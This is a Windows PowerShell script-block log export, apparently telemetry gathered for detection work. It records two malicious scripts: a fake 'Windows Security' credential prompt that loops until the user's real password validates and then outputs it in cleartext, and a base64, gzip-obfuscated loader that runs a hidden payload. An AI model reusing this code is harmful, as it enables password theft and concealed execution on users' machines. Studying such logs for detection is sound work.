Level	Date and Time	Source	Event ID	Task Category
Warning	10/09/2019 01:35:09	Microsoft-Windows-PowerShell	4104	Execute a Remote Command	"Creating Scriptblock text (1 of 1):
function Invoke-LoginPrompt{
$cred = $Host.ui.PromptForCredential(""Windows Security"", ""Please enter user credentials"", ""$env:userdomain\$env:username"","""")
$username = ""$env:username""
$domain = ""$env:userdomain""
$full = ""$domain"" + ""\"" + ""$username""
$password = $cred.GetNetworkCredential().password
Add-Type -assemblyname System.DirectoryServices.AccountManagement
$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
while($DS.ValidateCredentials(""$full"",""$password"") -ne $True){
    $cred = $Host.ui.PromptForCredential(""Windows Security"", ""Invalid Credentials, Please try again"", ""$env:userdomain\$env:username"","""")
    $username = ""$env:username""
    $domain = ""$env:userdomain""
    $full = ""$domain"" + ""\"" + ""$username""
    $password = $cred.GetNetworkCredential().password
    Add-Type -assemblyname System.DirectoryServices.AccountManagement
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    $DS.ValidateCredentials(""$full"", ""$password"") | out-null
    }
 $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password
 $output
 R{START_PROCESS}
}
Invoke-LoginPrompt

ScriptBlock ID: c7ca7056-b317-4fff-b796-05d8ef896dcd
Path: "
Warning	10/09/2019 01:35:08	Microsoft-Windows-PowerShell	4104	Execute a Remote Command	"Creating Scriptblock text (1 of 1):
&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAAlVdl0CA81UXW/aMBR996+4svJANJIfgNQHBNs6aaWIsO2hnSbXuaVeEzuyHdKI8d93YwIDTUJlfVkeLPme+3F87lEeay29Mho+6bV5xuSzWSk9t6as/IZF0mIOVxBdG+fTWqU74IOxEwJQeyWKAf+mdG4aBxnK2irf8iHweYHCIVAKWqgdHfJQ4bqECPV61AG5KYXS94e7FiXyIecxi/ZXYsBPcRbtyk6QXYiwx7ooAtJH4B3w+3BGRx0q4VxjbHhfRy79iH6GnkLPR6+L030eG+d5smwrhIQiWD4UbSCXtc5jmU6VRemNbTO0ayXRpWMpTa39jdBihSX1Y9E0o2kzbJLbh5+UfUEtSa+0VJUoJoZEffGDuwuK+5qO/ffR6EbIJ6UxZs2TKnBArNKvolC58Pjn5W7Ag5C0i4NUPIZEI0RLW2O8YUDfv1uEDNcNhaORQ+h9420LYtXt7nVWCUzO2CXgZywT8FfZJmRebJ2u6u32CbP/Mwv1nM4aCE4c9AtM7RNNSCjeMogoUNW+U1NjszfUGWGph8OCKCdmJ8IX2s+M1BzCNOyOjHSQvu/OYLHJluPF8sd8cTt5n2VbtmV///R+A6HMO3IQBQAA'))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))

ScriptBlock ID: 37f6d110-cfdf-4118-8748-17638e258531
Path: "
